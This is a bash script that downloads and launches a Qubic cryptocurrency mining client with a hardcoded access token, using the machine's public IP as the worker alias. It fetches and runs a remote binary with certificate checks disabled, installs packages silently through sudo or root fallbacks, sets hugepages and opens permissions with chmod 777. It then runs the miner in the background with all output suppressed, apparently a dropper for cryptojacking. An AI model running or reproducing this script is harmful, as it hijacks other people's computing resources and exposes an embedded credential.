#!/bin/bash

token="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJJZCI6ImNjMzNhMTFhLTVlYTYtNDhiZi04ZjdhLTE4YWUxNTgzY2EzOCIsIk1pbmluZyI6IiIsIm5iZiI6MTczMzQwODg5NCwiZXhwIjoxNzY0OTQ0ODk0LCJpYXQiOjE3MzM0MDg4OTQsImlzcyI6Imh0dHBzOi8vcXViaWMubGkvIiwiYXVkIjoiaHR0cHM6Ly9xdWJpYy5saS8ifQ.I1xLCpPaqL44LNlLvKtoN7CxCYd0xMZVnaWjBB4wT-fZ1UUaE7jM3dwPNP5c89ADFRPwog5O2hR0mJ-IsZsga7wcHIKnVJaDRCU3a2nWASG_DtF2xYGVE4lpHpCv6VUNDeNDDGZVPhgzM7kNpvUsLJMYcBLUZBsQIGEw2Aj2YqgmDia3q9zqU0OIzQ2RFYdRA1KbEbIjpiMHc_tXUYxEh5Y3_jg5hb8F1kKg_W6M1s5YTffQFseRukjx983AIJeLEVr6irJcj9RxbjRN7DRQzhaU4QGLAY-ipOGRhWqG_gZ7vOr8GPWQE4kSLSno-0dmTweoepC3jgzIOd22bXKKDA"
version="3.1.1"
hugepage="128"
work=`mktemp -d`

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
cores=2
addr=`wget --no-check-certificate -qO- http://checkip.amazonaws.com/ 2>/dev/null`
[ -n "$addr" ] || addr="NULL"

wget --no-check-certificate -qO- "https://dl.qubic.li/downloads/qli-Client-${version}-Linux-x64.tar.gz" |tar -zx -C "${work}"
[ -f "${work}/qli-Client" ] || exit 1

cat >"${work}/appsettings.json"<< EOF
{
  "ClientSettings": {
    "pps": false,
    "accessToken": "${token}",
    "alias": "${addr}",
    "trainer": {
      "cpu": true,
      "gpu": false
    },
    "autoUpdate": false
  }
}
EOF


sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1
sudo sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*hugepage)) >/dev/null 2>&1


chmod -R 777 "${work}"
cd "${work}"
nohup ./qli-Client >/dev/null 2>&1
